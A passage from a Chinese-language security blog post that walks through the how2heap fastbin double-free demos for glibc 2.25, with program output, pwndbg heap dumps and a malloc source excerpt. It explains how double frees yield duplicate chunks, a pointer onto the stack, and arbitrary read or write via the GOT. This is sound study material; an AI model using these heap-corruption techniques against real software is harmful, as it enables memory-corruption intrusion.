<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602020 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x21</span><br><span class="line">&#125;</span><br><span class="line">0x602040 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x20fa1</span><br><span class="line">&#125;</span><br><span class="line">0x602060 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 135073, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后 <code>free(a)</code>, <code>free(b)</code>。这时 fastbin 形成了一个 fastbin freelist：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602020 —▸ 0x602000 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>
<p>其中 <code>chunk A --&gt; chunk B</code>。</p>
<p>接下来再次释放 a，发现这次没发生报错，且形成了如下的 free list：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x602000 —▸ 0x602020 ◂— 0x602000</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>
<p><code>chunk A --&gt; chunk B &lt;-- chunk A</code></p>
<p>这样就可以绕过 fastbin 的 double free 检查了，原因如下：</p>
<blockquote>
<p>fastbin 可以看作一个 LIFO 的栈，使用单链表实现，通过 <code>fastbin-&gt;fd</code> 遍历 fastbins。由于 free 的过程会对 free list 做检查，我们不能连续两次 free 同一个 chunk，所以在这两次 free 之间增加了一次对其他 chunk 的 free 过程，从而绕过检查。再 malloc 三次，就在同一个地址 malloc 了两次，也就有了两个指向同一块内存区域的指针。</p>
</blockquote>
<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;fastbin_dup_into_stack </span><br><span class="line">This file extends on fastbin_dup.c by tricking malloc into</span><br><span class="line">returning a pointer to a controlled location (in this case, the stack).</span><br><span class="line">The address we want malloc() to return is 0x7fffffffdca8.</span><br><span class="line">Allocating 3 buffers.</span><br><span class="line">1st malloc(8): 0x603010</span><br><span class="line">2nd malloc(8): 0x603030</span><br><span class="line">3rd malloc(8): 0x603050</span><br><span class="line">Freeing the first one...</span><br><span class="line">If we free 0x603010 again, things will crash because 0x603010 is at the top of the free list.</span><br><span class="line">So, instead, we&#39;ll free 0x603030.</span><br><span class="line">Now, we can free 0x603010 again, since it&#39;s not the head of the free list.</span><br><span class="line">Now the free list has [ 0x603010, 0x603030, 0x603010 ]. We&#39;ll now carry out our attack by modifying data at 0x603010.</span><br><span class="line">1st malloc(8): 0x603010</span><br><span class="line">2nd malloc(8): 0x603030</span><br><span class="line">Now the free list has [ 0x603010 ].</span><br><span class="line">Now, we have access to 0x603010 while it remains at the head of the free list.</span><br><span class="line">so now we are writing a fake free size (in this case, 0x20) to the stack,</span><br><span class="line">so that malloc will think there is a free chunk there and agree to</span><br><span class="line">return a pointer to it.</span><br><span class="line">Now, we overwrite the first 8 bytes of the data at 0x603010 to point right before the 0x20.</span><br><span class="line">3rd malloc(8): 0x603010, putting the stack address on the free list</span><br><span class="line">4th malloc(8): 0x7fffffffdca8</span><br></pre></td></tr></table></figure>
<h3 id="顺序-1"><a href="#顺序-1" class="headerlink" title="顺序"></a>顺序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">a &#x3D; malloc(8)</span><br><span class="line">b &#x3D; malloc(8)</span><br><span class="line">c &#x3D; malloc(8)</span><br><span class="line">free(a)</span><br><span class="line">free(b)</span><br><span class="line">free(a)</span><br><span class="line">d &#x3D; malloc(8)</span><br><span class="line">malloc(8)</span><br><span class="line">stack_var &#x3D; 0x20</span><br><span class="line">*d &#x3D; (unsigned long long) (((char*)&amp;stack_var) - sizeof(d))</span><br><span class="line">malloc(8)</span><br><span class="line">malloc(8)</span><br></pre></td></tr></table></figure>
<h3 id="解释-2"><a href="#解释-2" class="headerlink" title="解释"></a>解释</h3><p>和上一题类似，首先申请三个 fastbin，然后通过 fastbin double free 操作形成了如下 freelist：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x603020 ◂— 0x603000</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>
<p>接下来 malloc chunk d。</p>
<p>因为申请的 d 也是 fastbin，程序会从 fastbins 中取一个出来。由于 fastbins 是 LIFO 策略，chunk A 会被取出来使用。此时的堆地址的数据如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;20a 0x603000</span><br><span class="line">0x603000:	0x0	0x21</span><br><span class="line">0x603010:	0x603020	0x0</span><br><span class="line">0x603020:	0x0	0x21</span><br><span class="line">0x603030:	0x603000	0x0</span><br><span class="line">0x603040:	0x0	0x21</span><br><span class="line">0x603050:	0x0	0x0</span><br><span class="line">0x603060:	0x0	0x20fa1</span><br><span class="line">0x603070:	0x0	0x0</span><br><span class="line">0x603080:	0x0	0x0</span><br><span class="line">0x603090:	0x0	0x0</span><br></pre></td></tr></table></figure>
<p>假如我们此时对 d 进行操作：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*d = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>) (((<span class="keyword">char</span>*)&amp;stack_var) - <span class="keyword">sizeof</span>(d));</span><br></pre></td></tr></table></figure>
<p>其中，<code>stack_var = 0x20</code> 的定义在函数内，也就是栈上。此时栈结构及其数据如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x603000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 33, </span><br><span class="line">  fd &#x3D; 0x7fffffffdc58, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x21</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; x&#x2F;20a 0x603000</span><br><span class="line">0x603000:	0x0	0x21</span><br><span class="line">0x603010:	0x7fffffffdc58	0x0</span><br><span class="line">0x603020:	0x0	0x21</span><br><span class="line">0x603030:	0x603000	0x0</span><br><span class="line">0x603040:	0x0	0x21</span><br><span class="line">0x603050:	0x0	0x0</span><br><span class="line">0x603060:	0x0	0x20fa1</span><br><span class="line">0x603070:	0x0	0x0</span><br><span class="line">0x603080:	0x0	0x0</span><br><span class="line">0x603090:	0x0	0x0</span><br><span class="line">pwndbg&gt; x&#x2F;20a 0x7fffffffdc58</span><br><span class="line">0x7fffffffdc58:	0x40091a &lt;main+628&gt;	0x20</span><br><span class="line">0x7fffffffdc68:	0x603010	0x603030</span><br><span class="line">0x7fffffffdc78:	0x603050	0x603010</span><br><span class="line">0x7fffffffdc88:	0x627da7b743913600	0x4009a0 &lt;__libc_csu_init&gt;</span><br><span class="line">0x7fffffffdc98:	0x7ffff7a2d830 &lt;__libc_start_main+240&gt;	0x1</span><br><span class="line">0x7fffffffdca8:	0x7fffffffdd78	0x1f7ffcca0</span><br><span class="line">0x7fffffffdcb8:	0x4006a6 &lt;main&gt;	0x0</span><br><span class="line">0x7fffffffdcc8:	0x4083e6753a0065fe	0x4005b0 &lt;_start&gt;</span><br><span class="line">0x7fffffffdcd8:	0x7fffffffdd70	0x0</span><br><span class="line">0x7fffffffdce8:	0x0	0xbf7c190a900065fe</span><br><span class="line">pwndbg&gt; stack 10</span><br><span class="line">00:0000│ rsp  0x7fffffffdc60 ◂— 0x20 &#x2F;* &#39; &#39; *&#x2F;</span><br><span class="line">01:0008│      0x7fffffffdc68 —▸ 0x603010 —▸ 0x7fffffffdc58 —▸ 0x40091a (main+628) ◂— 0x8e88348d0458d48</span><br><span class="line">02:0010│      0x7fffffffdc70 —▸ 0x603030 —▸ 0x603000 ◂— 0x0</span><br><span class="line">03:0018│      0x7fffffffdc78 —▸ 0x603050 ◂— 0x0</span><br><span class="line">04:0020│      0x7fffffffdc80 —▸ 0x603010 —▸ 0x7fffffffdc58 —▸ 0x40091a (main+628) ◂— 0x8e88348d0458d48</span><br><span class="line">05:0028│      0x7fffffffdc88 ◂— 0xb279771f7980f400</span><br><span class="line">06:0030│ rbp  0x7fffffffdc90 —▸ 0x4009a0 (__libc_csu_init) ◂— 0x41ff894156415741</span><br><span class="line">07:0038│      0x7fffffffdc98 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax</span><br><span class="line">08:0040│      0x7fffffffdca0 ◂— 0x1</span><br><span class="line">09:0048│      0x7fffffffdca8 —▸ 0x7fffffffdd78 —▸ 0x7fffffffe142 ◂— &#39;&#x2F;home&#x2F;qrz&#x2F;pwn&#x2F;how2heap&#x2F;glibc_2.25&#x2F;fastbin_dup_into_stack&#39;</span><br></pre></td></tr></table></figure>
<p>给 <code>stack_var</code> 赋值为 20 的原因是由于伪造的 chunk 要设置 size，size 的位置位于 <code>地址-0x8</code> 的地方。这样我们就伪造了 chunk a 的 fd。</p>
<p>此时 fastbins 内部结构如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x603000 —▸ 0x7fffffffdc58 —▸ 0x603010 ◂— 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>
<p>然后做一次 malloc，这里会将栈的地址放到 free list 上；</p>
<p>最后再 malloc 一次，根据上面的输出我们可以看到已经返回到栈上了。</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><blockquote>
<p>对于 fastbins，可以通过 double-free 覆盖 fastbins 的结构，来获得一个指向任意地址的指针。如果我们把这个地址指向 got 地址，如果我们可对 chunk 进行写或者读操作，我们就有了<strong>任意地址写</strong>和<strong>任意地址读</strong>。</p>
</blockquote>
<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>这里展示了 large bin 中 malloc_consolidate 机制 fast 对 double free 的检查。</p>
<h3 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ .&#x2F;glibc_2.25&#x2F;fastbin_dup_consolidate </span><br><span class="line">Allocated two fastbins: p1&#x3D;0x602010 p2&#x3D;0x602060</span><br><span class="line">Now free p1!</span><br><span class="line">Allocated large bin to trigger malloc_consolidate(): p3&#x3D;0x6020b0</span><br><span class="line">In malloc_consolidate(), p1 is moved to the unsorted bin.</span><br><span class="line">Trigger the double free vulnerability!</span><br><span class="line">We can pass the check in malloc() since p1 is not fast top.</span><br><span class="line">Now p1 is in unsorted bin and fast bin. So we&#39;will get it twice: 0x602010 0x602010</span><br></pre></td></tr></table></figure>
<h3 id="顺序："><a href="#顺序：" class="headerlink" title="顺序："></a>顺序：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p1 &#x3D; malloc(0x40)</span><br><span class="line">p2 &#x3D; malloc(0x40)</span><br><span class="line">free(p1)</span><br><span class="line">p3 &#x3D; malloc(0x400)</span><br><span class="line">free(p1)</span><br><span class="line">malloc(40)</span><br><span class="line">malloc(40)</span><br></pre></td></tr></table></figure>
<h3 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h3><p>首先申请两个 fastbin p1、p2：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 81, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602050 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 81, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6020a0 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 135009, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后释放 p1，p1 被加入了 fastbins 中。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602000 ◂— 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br></pre></td></tr></table></figure>
<p>接下来 <code>malloc(400)</code>，创建了一个 large bin。</p>
<hr>
<p>large bins</p>
<p>chunk 的指针数组，每个元素是一条双向循环链表的头部，但同一条链表中的块大小不一定相同，按照从小到大的顺序排列，每个 bin 保存一定大小范围的块，主要保存大小为 1024 字节以上的块。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">pwndbg&gt; smallbins </span><br><span class="line">smallbins</span><br><span class="line">0x50: 0x602000 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x602000</span><br></pre></td></tr></table></figure>
<p>我们会发现原本在 fastbins 中的 chunk p1 不见了，它跑到了 smallbins 里，而且 chunk p2 的 <code>prec_size</code> 和 <code>size</code> 字段都被修改了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 81, </span><br><span class="line">  fd &#x3D; 0x7ffff7dd1bb8 &lt;main_arena+152&gt;, </span><br><span class="line">  bk &#x3D; 0x7ffff7dd1bb8 &lt;main_arena+152&gt;, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602050 &#123;</span><br><span class="line">  prev_size &#x3D; 80, </span><br><span class="line">  size &#x3D; 80, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6020a0 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 1041, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x6024b0 PREV_INUSE &#123;</span><br><span class="line">  prev_size &#x3D; 0, </span><br><span class="line">  size &#x3D; 133969, </span><br><span class="line">  fd &#x3D; 0x0, </span><br><span class="line">  bk &#x3D; 0x0, </span><br><span class="line">  fd_nextsize &#x3D; 0x0, </span><br><span class="line">  bk_nextsize &#x3D; 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个时候就该读源码，查看 large 的分配：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">   While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">   even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">   fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">   Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">   large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">   invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">   it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>当分配 large chunk 时，首先根据 chunk 的大小获得对应的 large bin 的 index，接着判断当前分配区的 fast bins 中是否包含 chunk，如果有，调用 malloc_consolidate() 函数合并 fast bins 中的 chunk，并将这些空闲 chunk 加入 unsorted bin 中。因为这里分配的是一个 large chunk，所以 unsorted bin 中的 chunk 按照大小被放回 small bins 或 large bins 中。</p>
</blockquote>
<p>这个时候我们就可以再次释放 p1。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; fastbins </span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x602000 ◂— 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">pwndbg&gt; smallbins </span><br><span class="line">smallbins</span><br><span class="line">0x50 [corrupted]</span><br><span class="line">FD: 0x602000 ◂— 0x0</span><br><span class="line">BK: 0x602000 —▸ 0x7ffff7dd1bb8 (main_arena+152) ◂— 0x602000</span><br></pre></td></tr></table></figure>
<p>这个时候，我们既有 fastbins 中的 p1 又有 smallbins 中的 p2。因此我们可以 malloc 两次，第一次从 fastbins 中取出，第二次从 smallbins 中取出，且这两块新 chunk 处于同一个位置。</p>
<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2582">通过 how2heap 复习堆利用 (一）</a></p>

      </div>
      <div class="post-copyright">
    <p class="copyright-item">
      <span>Author: </span>
      <a href="http://www.qrzbing.cn/blog">qrzbing</a>
    </p>
    <p class="copyright-item">
      <span>Link: </span>
      <a href="http://www.qrzbing.cn/blog/2019/07/08/how2heap-1/">http://www.qrzbing.cn/blog/2019/07/08/how2heap-1/</a>
    </p>
    <p class="copyright-item">
      <span>License: </span><a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>
    </p>
  </div>
      <footer class="post-footer">
        <div class="post-tags">
            <a href="/blog/tags/pwn/">pwn</a>
            </div>
        
        <nav class="post-nav"><a class="prev" href="/blog/2019/07/08/how2heap-2/">
        <i class="iconfont icon-left"></i>
        <span class="prev-text nav-default">how2heap - 2</span>
        <span class="prev-text nav-mobile">Prev</span>
      </a>
    <a class="next" href="/blog/2019/06/17/%E7%BB%8F%E5%85%B8%E5%90%8C%E6%AD%A5%E9%97%AE%E9%A2%98/">
        <span class="next-text nav-default">生产者消费者问题</span>
        <span class="prev-text nav-mobile">Next</span>
        <i class="iconfont icon-right"></i>
      </a>
    </nav></footer>
    </article></div><div class="comments" id="comments"></div></div>
      </main>

      <footer id="footer" class="footer"><div class="social-links"><a href="mailto:qrzbing#gmail.com" class="iconfont icon-email" title="email"></a>
        <a target="_blank" rel="noopener" href="https://github.com/qrzbing" class="iconfont icon-github" title="github"></a>
        <a href="/blog/atom.xml" class="iconfont icon-rss" title="rss"></a>
    </div><div class="copyright">
  <span class="power-by">
    Powered by <a class="hexo-link" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>
  </span>
  <span class="division">|</span>
  <span class="theme-info">
    Theme - 
    <a class="theme-link" target="_blank" rel="noopener" href="https://github.com/ahonn/hexo-theme-even">Even</a>
  </span>

  <span class="copyright-year">&copy;2015 - 2021<span class="heart">
      <i class="iconfont icon-heart"></i>
    </span>
    <span class="author">qrzbing</span>
  </span>
</div>
</footer>

      <div class="back-to-top" id="back-to-top">
        <i class="iconfont icon-up"></i>
      </div>
    </div><script type="text/javascript" src="/blog/lib/jquery/jquery.min.js"></script>
  <script type="text/javascript" src="/blog/lib/slideout/slideout.js"></script>
